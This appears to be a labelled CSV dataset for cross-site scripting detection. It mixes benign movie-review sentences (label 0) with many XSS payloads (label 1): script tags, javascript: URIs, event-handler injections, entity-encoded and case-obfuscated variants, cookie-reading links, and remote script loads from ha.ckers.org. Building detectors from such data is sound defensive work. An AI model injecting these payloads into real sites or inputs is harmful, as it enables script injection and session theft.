label;sentence;1;;;;;;;;;;;;;;;;
0;""" In fact, it's hard to remember that the part of Ray Charles is being acted, and not played by the man himself.";;;;;;;;;;;;;;;;;
1;"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>";;;;;;;;;;;;;;;;;
1;<SCRIPT>ALERT(1)</SCRIPT>;;;;;;;;;;;;;;;;;
1;&#39;;&#88;&#83;&#83;&#39;&#41;>;;;;;;;;;;
0;If you check the director's filmography on this site you will see why this film didn't have a chance.;;;;;;;;;;;;;;;;;
0;Thanks good a movie like this was done and released.;;;;;;;;;;;;;;;;;
1;<A ONMOUSEOVER=ALERT(DOCUMENT.COOKIE)>XXS LINK</A>;;;;;;;;;;;;;;;;;
1;"</title><script>alert(""xss"");</script>";;;;;;;;;;;;;;;;;
1;"<SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT>";;;;;;;;;;;;;;;;;
1;<ScRiPT sRc=http://ha.CkERs.ORG/xSS.jS></ScRIpT>;;;;;;;;;;;;;;;;;
0;Jamie Foxx absolutely IS Ray Charles.;;;;;;;;;;;;;;;;;
1;<IMG SRc=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&;;;;;;;;;;;;;;;;;
1;"<imG dyNSrC=""JAVaSCRiPt:aLErT('Xss')"">";;;;;;;;;;;;;;;;;
0;"And there wasn't a single sour note struck acting-wise, either; some surprisingly solid casting, here.";;;;;;;;;;;;;;;;;
1;<a onmouseover=alert(document.cookie)>xxs link</a>;;;;;;;;;;;;;;;;;
0;I'm not sure what he was trying to do with this film.;;;;;;;;;;;;;;;;;
1;"<body background=""javascript:alert('xss')"">";;;;;;;;;;;;;;;;;
1;"<img src=javascript:alert(""xss"")>";;;;;;;;;;;;;;;;;
0;But what really made it unwatchable was the direction.;;;;;;;;;;;;;;;;;
1;"<Img """"""><ScRiPt>ALerT(""xSS"")</ScRipt>"">";;;;;;;;;;;;;;;;;
1;"<img src="" &#14;  javascript:alert('xss');"">";;;;;;;;;;;;;;;;;
1;"<IMG SRC='VBSCRIPT:MSGBOX(""XSS"")'>";;;;;;;;;;;;;;;;;
0;The attention given to every character, and complex psychological portrayals, detailing loyalty, treachery, love, and hope, are tremendous.;;;;;;;;;;;;;;;;;
1;<IMG srC=JAvASCriPt:AlERt('xSs')>;;;;;;;;;;;;;;;;;
1;"<img src=/ onerror=""alert(string.fromcharcode(88,83,83))""></img>";;;;;;;;;;;;;;;;;
0;Hence the whole story lacks a certain energy.;;;;;;;;;;;;;;;;;
0;I have to mention this and it is a huge SPOILER, i loved the ending, how all the characters of the three films were the remaining survivors of the ferry disaster, with Valentine and the young judge together, and the old man watching it on her TV, solidifying his happiness over the suffering which he dealt with for those many years.;;;;;;;;;;;;;;;;;
0;Ray Charles' life provided excellent biographical material for the film, which goes well beyond being just another movie about a musician.;;;;;;;;;;;;;;;;;
0;His performance is simply genius.;;;;;;;;;;;;;;;;;
1;"<ImG SRc=""JAVaSCRiPt:aleRt('xSS')""";;;;;;;;;;;;;;;;;
0;I recommend this for EVERYONE who loves film, movies, anything...A Work of Art!;;;;;;;;;;;;;;;;;
1;"';!--""<XSS>=&{()}";;;;;;;;;;;;;;;;;
1;""" ONFOCUS=""ALERT(1)"" NAME=""BOUNTY";;;;;;;;;;;;;;;;;
1;<img src=javascript:alert('xss')>;;;;;;;;;;;;;;;;;
1;"<img src= onmouseover=""alert('xxs')"">";;;;;;;;;;;;;;;;;
0;That was funny.;;;;;;;;;;;;;;;;;
0;Do not waste your time.;;;;;;;;;;;;;;;;;
0;Overall, this movie was cheap trash.;;;;;;;;;;;;;;;;;
0;You can't even tell if they have any talent because they not only have pathetic lines to speak but the director gave them no action.;;;;;;;;;;;;;;;;;
0;All in all a beautiful directed film from Nicola's roeg wih a sublime cast.;;;;;;;;;;;;;;;;;
1;"<IMG SRC=""JAV&#X09;ASCRIPT:ALERT('XSS');"">";;;;;;;;;;;;;;;;;
1;<sVg><x><ScRipT>AlerT(1)</x>;;;;;;;;;;;;;;;;;
1;"<body onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""xss"")>";;;;;;;;;;;;;;;;;
1;"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">";;;;;;;;;;;;;;;;;
0;Summary: The witticisms weren't witty.;;;;;;;;;;;;;;;;;
1;"<IMG onmouseover=""alert('xxs')"">";;;;;;;;;;;;;;;;;
1;<IMG SRc=jAVAscRIPT:aleRt(strInG.fROmCharcodE(88,83,83))>;;;;;;;;;;;;;;;;;
1;"\"";ALERT('XSS');//";;;;;;;;;;;;;;;;;
1;"<IMG LOWSRC=""JAVASCRIPT:ALERT('XSS')"">";;;;;;;;;;;;;;;;;
1;"<img src=""javascript:alert('xss');"">";;;;;;;;;;;;;;;;;
1;"<INPUT TYPE=""IMAGE"" SRC=""JAVASCRIPT:ALERT('XSS');"">";;;;;;;;;;;;;;;;;
1;"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">";;;;;;;;;;;;;;;;;
1;"';!--""<XSS>=&{()}";;;;;;;;;;;;;;;;;
1;"<iMg Src=# OnmOuseOVer=""ALerT('xxS')"">";;;;;;;;;;;;;;;;;
0;Ray Charles is legendary.;;;;;;;;;;;;;;;;;
1;<BODY ONLOAD=alert('XSS')>;;;;;;;;;;;;;;;;;
0;You truly take this journey through the eyes and soul of a child.;;;;;;;;;;;;;;;;;
0;If good intentions made a film great, then this film might be one of the greatest films ever made.;;;;;;;;;;;;;;;;;
0;I couldn't think of a better way to end the film, but a smile on my face, great way to wrap up an amazing film and trilogy!;;;;;;;;;;;;;;;;;
0;"He owns the film, just as Spacek owned ""Coal Miner's Daughter"" and Quaid owned ""Great Balls of Fire.";;;;;;;;;;;;;;;;;
1;<scRiPt>AlERT(1)</ScRIPT>;;;;;;;;;;;;;;;;;
1;<svg><x><script>alert(1)</x>;;;;;;;;;;;;;;;;;
1;<iframe src=http://ha.ckers.org/scriptlet.html <;;;;;;;;;;;;;;;;;
1;<img src=&#106;;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40
0;The soundtrack sucked.;;;;;;;;;;;;;;;;;
1;"<IMG SRC=""JAV	ASCRIPT:ALERT('XSS');"">";;;;;;;;;;;;;;;;;
1;"<iMG SrC=JAvaScRipT:AlErT(""xsS"")>";;;;;;;;;;;;;;;;;
0;I think i was one of the people who found this another one of roth's pearls.;;;;;;;;;;;;;;;;;
0;The flat reenactments don't hold your attention because they are emotionally adrift and stagy.;;;;;;;;;;;;;;;;;
1;"<img onmouseover=""alert('xxs')"">";;;;;;;;;;;;;;;;;
1;<SVG><SCRIPT>ALERT(1)<P>;;;;;;;;;;;;;;;;;
1;<IMG SRC=JAVASCRIPT:ALERT('XSS')>;;;;;;;;;;;;;;;;;
1;"<SCRIPT/XSS SRC=""HTTP://HA.CKERS.ORG/XSS.JS""></SCRIPT>";;;;;;;;;;;;;;;;;
1;<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>;;;;;;;;;;;;;;;;;
1;<IMG SRC=&#106;;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40
0;The dialogue sucked.;;;;;;;;;;;;;;;;;
0;his performance, as awarded, was stunning.;;;;;;;;;;;;;;;;;
0;Ironically I mostly find his films a total waste of time to watch.;;;;;;;;;;;;;;;;;
0;The acting sucked.;;;;;;;;;;;;;;;;;
0;When I first watched this movie, in the 8s, I loved it.;;;;;;;;;;;;;;;;;
0;Hitchcock is a great director.;;;;;;;;;;;;;;;;;
0;The concert sequences just sucked.;;;;;;;;;;;;;;;;;
1;"<BOdy oNLoAD!#$%&()*~+-_.,:;?@[/|\]^`=ALert(""xss"")>";;;;;;;;;;;;;;;;;
0;I was totally fascinated by the music, the dancing... everything.;;;;;;;;;;;;;;;;;
1;"\"";alert('xss');//";;;;;;;;;;;;;;;;;
1;<ifRAme sRC=hTTP://ha.cKeRS.org/SCriptlEt.HtmL <;;;;;;;;;;;;;;;;;
1;"<IMG LOWSRC=""javascript:alert('XSS')"">";;;;;;;;;;;;;;;;;
1;<SCRIPT SRC=HTTP://HA.CKERS.ORG/XSS.JS></SCRIPT>;;;;;;;;;;;;;;;;;
0;The film has great actors, a master director, a significant theme--at least a would-be significant theme, undertone of fifties existential world-weariness, aerial scenes that ought to have thrilled both senses and imagination, and characters about which one might deeply care.;;;;;;;;;;;;;;;;;
0;It's this pandering to the audience that sabotages most of his films.;;;;;;;;;;;;;;;;;
1;"<img src=`javascript:alert(""rsnake says, 'xss'"")`>";;;;;;;;;;;;;;;;;
0;The cinematography is simply stunning (to say the least) and the fx are nothing if not state-of-the-art.;;;;;;;;;;;;;;;;;
1;&#39;;&#88;&#83;&#83;&#39;&#41;>;;;;;;;;;;
0;It was so funny.;;;;;;;;;;;;;;;;;
1;"<imG SrC='VbsCripT:msGboX(""Xss"")'>";;;;;;;;;;;;;;;;;
1;"<input type=""image"" src=""javascript:alert('xss');"">";;;;;;;;;;;;;;;;;
0;The plot - well, I said I'd let that one go.;;;;;;;;;;;;;;;;;
0;He can bore you to pieces, and kill the momentum of a movie, quicker than anyone else.;;;;;;;;;;;;;;;;;
1;"<STYLE>LI {LIST-STYLE-IMAGE: URL(""JAVASCRIPT:ALERT('XSS')"");}</STYLE><UL><LI>XSS</BR>";;;;;;;;;;;;;;;;;
1;"<IMG SRC=""jav	ascript:alert('XSS');"">";;;;;;;;;;;;;;;;;
1;"<IMG SRC= onmouseover=""alert('xxs')"">";;;;;;;;;;;;;;;;;
1;<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >;;;;;;;;;;;;;;;;;
1;"<IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`>";;;;;;;;;;;;;;;;;
1;"<IMG SRC= ONMOUSEOVER=""ALERT('XXS')"">";;;;;;;;;;;;;;;;;
0;Up there with the best of Melville.;;;;;;;;;;;;;;;;;
0;Really bad.;;;;;;;;;;;;;;;;;
1;"<img src=""livescript:[code]"">";;;;;;;;;;;;;;;;;
0;There are the usual Hitchcock logic flaws.;;;;;;;;;;;;;;;;;
1;<SCRIPT SRC=HTTP://HA.CKERS.ORG/XSS.JS?< B >;;;;;;;;;;;;;;;;;
0;Everything about this film is simply incredible.;;;;;;;;;;;;;;;;;
0;In a most wonderful location lies a story of contrast.;;;;;;;;;;;;;;;;;
0;And his subtle connections between the three films are awesome.;;;;;;;;;;;;;;;;;
1;<body onload=alert('xss')>;;;;;;;;;;;;;;;;;
1;"<iMG src=""LiveScRIPt:[cODe]"">";;;;;;;;;;;;;;;;;
1;"<IMG srC=""jAVAscRiPT:aLErT('xSs');"">";;;;;;;;;;;;;;;;;
0;However, I recently watched the whole thing again on DVD, and I was completely struck by how extremely stupid the storyline was - how it contained holes, inconsistencies and - frankly - a whole lot of crap - and how horrid the dancing was.;;;;;;;;;;;;;;;;;
1;<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;;//;;;;;;;;;;;;;;;
1;"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">";;;;;;;;;;;;;;;;;
1;"<IMG SRC=/ ONERROR=""ALERT(STRING.FROMCHARCODE(88,83,83))""></IMG>";;;;;;;;;;;;;;;;;
1;"<IMG """"""><SCRIPT>ALERT(""XSS"")</SCRIPT>"">";;;;;;;;;;;;;;;;;
0;Schrader has made a resume full of lousy, amateurish films.;;;;;;;;;;;;;;;;;
1;<IMG SRC=&#106;;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40
1;<SCRIPT SRC=//ha.ckers.org/.j>;;;;;;;;;;;;;;;;;
0;The performances are real and gripping, the crocdodile is extremely well done, indeed if the Black Water website is to be believed that's because they used real crocs and the swamp location is fabulous.;;;;;;;;;;;;;;;;;
1;<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&;;;;;;;;;;;;;;;;;
0;Bad script, bad direction and horrible acting make this one plain bad!;;;;;;;;;;;;;;;;;
1;"<IMG SRC=""javascript:alert('XSS')""";;;;;;;;;;;;;;;;;
0;The movie lacks visual interest, drama, expression of feeling, and celebration of the very patriotism that underlines the narrative.;;;;;;;;;;;;;;;;;
1;<script src=http://ha.ckers.org/xss.js></script>;;;;;;;;;;;;;;;;;
1;"<IMG SRC=# ONMOUSEOVER=""ALERT('XXS')"">";;;;;;;;;;;;;;;;;
1;"<iMg SRC= oNmOUsEOVer=""aleRT('XXs')"">";;;;;;;;;;;;;;;;;
0;Unfortunately, this is a bad movie that is just plain bad.;;;;;;;;;;;;;;;;;
0;Even Billy Bob couldn't rise above the script, which was worse.;;;;;;;;;;;;;;;;;
1;<IMG SRC=javascript:alert('XSS')>;;;;;;;;;;;;;;;;;
1;<img src=&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3a&#x61&#x6c&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>;;;;;;;;;;;;;;;;;
1;"<IMG ONMOUSEOVER=""ALERT('XXS')"">";;;;;;;;;;;;;;;;;
0;And the rest of it just sits there being awful... with soldiers singing songs about the masculinity they pledge themselves to, hairsplitting about purity, the admiration of swords, etc.;;;;;;;;;;;;;;;;;
1;<a onmouseover=alert(document.cookie)>xxs link</a>;;;;;;;;;;;;;;;;;
0;Conceptually, the show offers a little bit of everything- and for just about everybody (parents, kids, fantasy and/or fx fans).;;;;;;;;;;;;;;;;;
1;""" onfocus=""alert(1)"" name=""bounty";;;;;;;;;;;;;;;;;
1;"<a onmouseover=""alert(document.cookie)"">xxs link</a>";;;;;;;;;;;;;;;;;
